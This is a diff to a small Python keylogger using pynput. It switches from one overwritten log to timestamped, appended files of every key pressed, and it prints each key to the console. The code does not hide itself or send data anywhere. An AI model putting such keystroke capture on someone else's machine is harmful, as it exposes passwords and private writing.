@@ -1,24 +1,24 @@
 import listener
 import pynput
+from datetime import datetime
+import pytz
 from pynput.keyboard import Key, Listener
 
-keys = []
+cdt = datetime.now().date()
+EST = pytz.timezone('US/Eastern')
+local_time = datetime.now(EST).time()
 
 def on_press(key):
-    keys.append(key)
-    write_file(keys)
+    write_file(key)
 
     try:
         print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
         print('special key {0} pressed'.format(key))
 
-def write_file(keys):
-    with open('log.txt', 'w') as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            f.write(k)
-            f.write(' ')
+def write_file(key):
+    with open(f'{cdt} Key Logs for {local_time}.txt', 'a') as f:
+        f.write(f"({datetime.now()}) {key} pressed\n")
 
 def on_release(key):
     print('{0} released'.format(key))
@@ -27,5 +27,3 @@ def on_release(key):
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
-
-#comments to test check in and check out
